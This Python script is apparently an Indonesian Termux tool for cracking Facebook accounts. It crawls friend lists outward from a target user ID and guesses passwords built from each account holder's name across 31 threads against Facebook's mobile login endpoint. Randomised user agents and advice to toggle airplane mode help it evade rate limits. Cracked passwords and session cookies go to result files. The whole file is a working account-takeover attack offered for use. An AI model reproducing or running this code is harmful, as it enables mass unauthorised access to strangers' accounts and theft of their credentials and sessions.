import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
import subprocess
import uuid
from time import sleep
import unicodedata
import threading
import hashlib
from rich import pretty
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred

class Warna_Gua:
    P = '\x1b[1;97m'
    M = '\x1b[1;91m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    B = '\x1b[1;94m'
    U = '\x1b[1;95m'
    O = '\x1b[1;96m'
    N = '\x1b[0m'
    Z = "\033[1;30m"
    OO = '\x1b[38;5;208m'
    x = '\33[m'
    m = '\x1b[1;91m'
    k = '\033[93m'
    h = '\x1b[1;92m'
    hh = '\033[32m'
    u = '\033[95m'
    kk = '\033[33m'
    b = '\33[1;96m'
    o = '\x1b[38;5;208m'

class UserAgentGenerator:
    def __init__(self):
        self.ugen = []
        self.generate_user_agents()

    def generate_user_agents(self):
        def generate_ua(platform, build, chrome_version_range, build_version_range, safari_version_range, extra_text=""):
            android_version = random.choice(['10', '11', '12', '13', '14'])
            chrome_version = random.randrange(*chrome_version_range)
            build_version = random.randrange(*build_version_range)
            safari_version = random.randrange(*safari_version_range)
            return f'Mozilla/5.0 ({platform}; Android {android_version}; {build} Build/{extra_text}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.{build_version}.{safari_version} Mobile Safari/537.36'

        devices = [
            ("Linux", "Pixel 6", (92, 115), (4200, 6000), (62, 199), "SD1A.210817.023; wv"),
            ("Linux", random.choice(["SM-A205U", "SM-A102U", "SM-G960U"]), (92, 115), (4200, 6000), (62, 199)),
            ("Linux", "MiTV-AESP0", (92, 115), (3200, 5900), (62, 199), "PI; wv"),
            ("Linux", "ASUS_Z00AD", (92, 115), (3200, 5900), (62, 199), "LRX21V"),
            ("Linux", "RMX3371", (92, 115), (3200, 5900), (62, 199), "TP1A.220905.001; wv"),
            ("Linux", "ASUS_I005DA", (92, 115), (3200, 5900), (62, 199), "SKQ1.210821.001; wv"),
            ("Linux", "Pixel 6 ua", (92, 115), (3200, 5900), (62, 199), "UPB3.230519.014; wv"),
            ("Linux", "SM-G960U", (92, 115), (3200, 5900), (62, 199), "QP1A.190711.020; wv"),
            ("Linux", "V2171A", (92, 115), (3200, 5900), (62, 199), "TP1A.220624.014; wv"),
            ("Linux", "REVVL V+ 5G", (92, 115), (3200, 5900), (62, 199)),
            ("Linux", "CPH2451", (92, 115), (3200, 5900), (62, 199), "TP1A.220905.001; wv"),
            ("Linux; U", "PEPM00", (92, 115), (3200, 5900), (40, 150), "TP1A.220905.001")
        ]

        for device in devices:
            self.ugen.extend([generate_ua(*device) for _ in range(10000)])

        for _ in range(10000):
            platform = "Windows NT"
            version = random.choice(['10', '11', '12', '13', '14'])
            chrome_version = random.randrange(92, 115)
            build_version = random.randrange(3200, 5900)
            safari_version = random.randrange(40, 150)
            self.ugen.append(f'Mozilla/5.0 ({platform} {version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.{build_version}.{safari_version} Safari/537.36')

        for _ in range(10000):
            platform = "iPhone"
            version = random.choice(['11', '12', '13', '14', '15', '16'])
            safari_version = random.randrange(4200, 6000)
            self.ugen.append(f'Mozilla/5.0 ({platform}; CPU {platform} OS {version}_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/{safari_version}')

class FacebookLogin:
    def __init__(self):
        self.ses = requests.Session()
        self.tokenku = []
        self.console = Console()

    def login(self):
        try:
            token = open('/sdcard/ARAIIXYZZ/TOKEN/token.txt', 'r').read()
            cok = open('/sdcard/ARAIIXYZZ/COOKIES/cookies.txt', 'r').read()
            self.tokenku.append(token)
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + self.tokenku[0], cookies={'cookie': cok})
            sy.raise_for_status()
            data = json.loads(sy.text)
            return data['name'], data['id']
        except Exception as e:
            print(f"Error: {e}")
            return None, None

    def login_lagi(self):
        os.system('clear')
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Put Your Cookies Facebook")
        cok = input(f'{Warna_Gua.b}     ╰─{Warna_Gua.P} Cokie : {Warna_Gua.b}')
        open('/sdcard/ARAIIXYZZ/COOKIES/cookies.txt', 'w').write(cok)
        try:
            self.ses.headers.update({
                'Accept-Language': 'id,en;q=0.9',
                'User -Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                'Referer': 'https://www.instagram.com/',
                'Host': 'www.facebook.com',
                'Sec-Fetch-Mode': 'cors',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Dest': 'empty',
                'Origin': 'https://www.instagram.com',
                'Accept-Encoding': 'gzip, deflate',
            })
            response = self.ses.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/adi_wiyono21/', cookies={'cookie': cok})
            if '"access_token":' in str(response.headers):
                token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                open('/sdcard/ARAIIXYZZ/TOKEN/token.txt', 'w').write(token)
                print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} That Your Token Facebook")
                exit(f'{Warna_Gua.b}     ╰─{Warna_Gua.P} Token : {Warna_Gua.b}{token}'); time.sleep(3)
            else:
                exit()
        except Exception as e:
            exit(e)

class FacebookMenu:
    def __init__(self, name, user_id):
        self.name = name
        self.user_id = user_id
        self.id = []
        self.id2 = []
        self.loop = 0
        self.ok = 0
        self.cp = 0

    def display_menu(self):
        os.system('clear')
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} User Information")
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} Fullnames :{Warna_Gua.b} {self.name}')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} Useruidzs :{Warna_Gua.b} {self.user_id}')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} ScVersion :{Warna_Gua.b} Lite Script')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} Telegrams :{Warna_Gua.b} @AraiiXyzz')
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Script Features")
        print(f'    {Warna_Gua.b}1{Warna_Gua.P}. Crack From Publick Random ({Warna_Gua.b}Unlimited Dump{Warna_Gua.P}) ')
        print(f'    {Warna_Gua.b}0{Warna_Gua.P}. Exitz From Tools')
        AX = input(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›{Warna_Gua.b} ')
        if AX in ['1']:
            self.publik()
        elif AX in ['0']:
            self.remove_cookie()
            print(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›Moved the cookies ')
            exit()
        else:
            print(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›Invalid Option ')
            self.display_menu()

    def publik(self):
        try:
            token = open('/sdcard/ARAIIXYZZ/TOKEN/token.txt', 'r').read()
            cok = open('/sdcard/ARAIIXYZZ/COOKIES/cookies.txt', 'r').read()
        except IOError:
            exit()
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Your Targets Useruidz {Warna_Gua.b}({Warna_Gua.P}ctrl+c{Warna_Gua.b}){Warna_Gua.P} Fot Stop Dumps")
        user_dump = input(f'    {Warna_Gua.b}＼{Warna_Gua.P} Targets User : {Warna_Gua.b}')
        uid = [user_dump]
        processed_ids = set()
        try:
            while uid:
                current_id = random.choice(uid)
                uid.remove(current_id)
                if current_id in processed_ids:
                    continue
                processed_ids.add(current_id)
                try:
                    col = requests.get(f"https://graph.facebook.com/{current_id}?fields=friends&access_token={token}", cookies={'cookies': cok}).json()
                    for x in col['friends']['data']:
                        try:
                            sys.stdout.write(f"\r    {Warna_Gua.b}＼{Warna_Gua.P} Collected ID : {Warna_Gua.b}{len(self.id)} {Warna_Gua.P}ID: {Warna_Gua.b}{x['id']}")
                            sys.stdout.flush()
                            if x['id'] + '|' + x['name'] not in self.id:
                                self.id.append(x['id'] + '|' + x['name'])
                                if x['id'] not in processed_ids:
                                    uid.append(x['id'])
                        except:
                            continue
                except (KeyError, IOError):
                    pass
                except requests.exceptions.ConnectionError:
                    exit()
        except KeyboardInterrupt:
            pass
        self.setting()

    def setting(self):
        print(" ")
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}] {Warna_Gua.P}Your Choice Targets")
        print(f'    {Warna_Gua.b}1{Warna_Gua.P}. Priority Targets ({Warna_Gua.b}OLD{Warna_Gua.P}) ')
        print(f'    {Warna_Gua.b}2{Warna_Gua.P}. Priority Targets ({Warna_Gua.b}NEW{Warna_Gua.P}) ')
        print(f'    {Warna_Gua.b}3{Warna_Gua.P}. Priority Targets ({Warna_Gua.b}RDM{Warna_Gua.P}) ')
        hu = input(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›{Warna_Gua.b} ')
        if hu in ['1', '01']:
            for Old in sorted(self.id):
                self.id2.append(Old)
        elif hu in ['2', '02']:
            New = []
            for Random in sorted(self.id):
                New.append(Random)
            bcm = len(New)
            bcmi = (bcm - 1)
            for xmud in range(bcm):
                self.id2.append(New[bcmi])
                bcmi -= 1
        elif hu in ['3', '03']:
            for Random in self.id:
                xx = random.randint(0, len(self.id2))
                self.id2.insert(xx, Random)
        else:
            print(' [!] Pilih Yang Bener ')
            exit()
        self.passwordlist()

    def passwordlist(self):
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Result Save In ")
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P}./sdcard/ARAIIXYZZ/RESULT/HASIL OK/{datetime.datetime.now().strftime("%d-%m-%Y")}.txt')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P}./sdcard/ARAIIXYZZ/RESULT/HASIL CP/{datetime.datetime.now().strftime("%d-%m-%Y")}.txt')
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Crack Process Begins Turn Off Airplane Mode Every{Warna_Gua.b} 500 ID\n ")
        with tred(max_workers=31) as pool:
            for user in self.id2:
                idf, nama = user.split('|')[0], user.split('|')[1].lower()
                urutan = []
                if len(nama) < 4:
                    continue
                elif len(nama) > 5:
                    urutan.append(nama)
                    urutan.append(nama + '12')
                    urutan.append(nama + '123')
                    urutan.append(nama + '1234')
                    urutan.append(nama + '12345')
                    urutan.append(nama + '123456')
                    urutan.append(nama + '2024')
                    urutan.append(nama + ' 123')
                    urutan.append(nama + '321')
                    urutan.append(nama + ' cantik')
                    urutan.append('kamu nanya')
                pool.submit(self.M1, idf, urutan, nama)

    def M1(self, idf, urutan, nama):
        print(f" {Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.H} GassBoss {Warna_Gua.u}{self.loop} {Warna_Gua.P}Collected {Warna_Gua.u}{str(len(self.id))} {Warna_Gua.P}Success {Warna_Gua.b}{self.ok} {Warna_Gua.P}Failed {Warna_Gua.k}{self.cp}", end="\r")
        sys.stdout.flush()
        ses = requests.Session()
        for pw in urutan:
            try:
                ua = random.choice(UserAgentGenerator().ugen)
                headers = {
                    "User -Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "cache-control": "max-age=0",
                    "dpr": "2.25",
                    "viewport-width": "980",
                    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-ch-ua-platform-version": '"8.1.0"',
                    "sec-ch-ua-model": '"vivo 1814"',
                    "sec-ch-ua-full-version-list": '"Not(A:Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.137", "Chromium";v="133.0.6943.137"',
                    "sec-ch-prefers-color-scheme": "light",
                    "origin": "https://m.facebook.com",
                    "upgrade-insecure-requests": "1",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "referer": f"https://m.facebook.com/login/device-based/password/?uid={idf}&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2Fspecific_login%2F%3Faccount_id%3D{idf}%26next%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdevice_based_login%252F%253Fhide_back_button%253D1%2526from_accounts_center%253D1%26wtsid%3Drdr_0xcgsg3j2GTSiQTC8&flow=fx_reauth&is_profile_switching=0&wtsid=rdr_0xcgsg3j2GTSiQTC8&refsrc=deprecated&_rdr",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "priority": "u=0, i",
                }
                requ = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2Fspecific_login%2F%3Faccount_id%3D{idf}%26next%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdevice_based_login%252F%253Fhide_back_button%253D1%2526from_accounts_center%253D1%26wtsid%3Drdr_0xcgsg3j2GTSiQTC8&flow=fx_reauth&is_profile_switching=0&wtsid=rdr_0xcgsg3j2GTSiQTC8&refsrc=deprecated&_rdr')
                lsd = re.search('name="lsd" value="(.*?)"', requ.text).group(1)
                jazoest = re.search('name="jazoest" value="(.*?)"', requ.text).group(1)
                data = {
                    'lsd': lsd,
                    'jazoest': jazoest,
                    'uid': idf,
                    'next': f'https://m.facebook.com/fxauth/specific_login/?account_id={idf}&next=https%3A%2F%2Fwww.facebook.com%2Fdevice_based_login%2F%3Fhide_back_button%3D1%26from_accounts_center%3D1&wtsid=rdr_0xcgsg3j2GTSiQTC8',
                    'flow': 'fx_reauth',
                    'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pw}'
                }
                url_post = 'https://m.facebook.com/login/device-based/validate-password/?shbl=0'
                po = ses.post(url_post, headers=headers, data=data, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict().keys():
                    self.ok += 1
                    coki = ses.cookies.get_dict()
                    kuki = ";".join([f"{key}={value}" for key, value in coki.items()])
                    print(f" {Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.H} Login Berhasil!{Warna_Gua.P}")
                    print(f" {Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Informasi Akun:")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} Fullnames :{Warna_Gua.H} {nama}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} Useruidzs :{Warna_Gua.H} {idf}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} Passwords :{Warna_Gua.H} {pw}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} LsdValues :{Warna_Gua.H} {lsd}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} JzsValues :{Warna_Gua.H} {jazoest}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} Cookies   :{Warna_Gua.H} {kuki}\n")
                    with open("hasil_ok.txt", "a") as f:
                        f.write(f"ID: {idf} | PW: {pw} | Cookies: {kuki}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict().keys():
                    self.cp += 1
                    print(f" {Warna_Gua.k}[{Warna_Gua.P}●{Warna_Gua.k}]{Warna_Gua.m} Checkpoint Terdeteksi!{Warna_Gua.P}")
                    print(f" {Warna_Gua.k}[{Warna_Gua.P}●{Warna_Gua.k}]{Warna_Gua.P} Informasi Akun:")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} Fullnames :{Warna_Gua.k} {nama}")
                    print(f"     {Warna_Gua.k}＼{Warna_Gua.P} Useruidzs :{Warna_Gua.k} {idf}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} Passwords :{Warna_Gua.k} {pw}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} LsdValues :{Warna_Gua.k} {lsd}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} JzsValues :{Warna_Gua.k} {jazoest}")
                    print(f"     {Warna_Gua.b}＼{Warna_Gua.P} UserAgent :{Warna_Gua.k} {ua}\n")
                    with open("hasil_cp.txt", "a") as f:
                        f.write(f"ID: {idf} | PW: {pw} | Lsd: {lsd} | Jz: {jazoest}\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(3)
            except Exception as e:
                pass
        self.loop += 1

class Main:
    def __init__(self):
        self.user_agent_generator = UserAgentGenerator()
        self.facebook_login = FacebookLogin()
        self.run()

    def run(self):
        name, user_id = self.facebook_login.login()
        if name and user_id:
            menu = FacebookMenu(name, user_id)
            menu.display_menu()
        else:
            self.facebook_login.login_lagi()

if __name__ == '__main__':
    try:
        os.mkdir('/sdcard/ARAIIXYZZ')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/TOKEN')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/COOKIES')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/RESULT')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/RESULT/HASIL OK')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/RESULT/HASIL CP')
    except: pass
    Main()